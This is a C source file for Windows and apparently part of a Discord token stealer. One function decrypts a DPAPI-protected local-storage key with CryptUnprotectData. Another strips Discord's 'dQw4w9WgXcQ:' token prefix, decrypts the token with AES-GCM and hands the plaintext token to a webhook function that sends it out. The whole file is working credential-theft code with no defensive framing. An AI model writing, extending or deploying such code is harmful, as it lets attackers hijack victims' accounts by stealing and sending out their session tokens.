#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#include "main.h"

extern webhook webhook_details;
int decrypt_token(char *encrypted_token, const char *local_storage_key,
		  int local_storage_key_size)
{
	encrypted_token += strlen("dQw4w9WgXcQ:"); // skip this
	DWORD token_size = 0;
	CryptStringToBinaryA(encrypted_token, 0, CRYPT_STRING_BASE64, NULL,
			     &token_size, NULL, NULL);
	BYTE *token_bytes = calloc(1, token_size);
	CryptStringToBinaryA(encrypted_token, 0, CRYPT_STRING_BASE64,
			     token_bytes, &token_size, NULL, NULL);
	char *decrypted_token = NULL;
	if (aes_gcm_decrypt(&decrypted_token,
			    (unsigned char *)local_storage_key, token_bytes,
			    token_size) != 0) {
		ERROR_PRINT("Failed to decrypt token\n");
		goto fail;
	}
	execute_webhook(&webhook_details, decrypted_token);

	return 0;
fail:
	free(token_bytes);
	return 1;
}

int decrypt_key(char *key, char **key_out, int *key_out_size)
{
	DWORD key_size = 0;
	CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &key_size, NULL,
			     NULL);
	BYTE *key_bytes = calloc(1, key_size);
	CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, key_bytes, &key_size,
			     NULL, NULL);
	key_bytes += 5; // skip the first 5 bytes of the key
	DATA_BLOB in;
	DATA_BLOB out;
	in.cbData = key_size;
	in.pbData = key_bytes;
	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
		ERROR_PRINT("Failed to decrypt key\n");
		goto fail;
	}
	*key_out = malloc(out.cbData);
	memcpy(*key_out, out.pbData, out.cbData);
	*key_out_size = out.cbData;
	return 0;
fail:
	free(key_bytes);
	return 1;
}
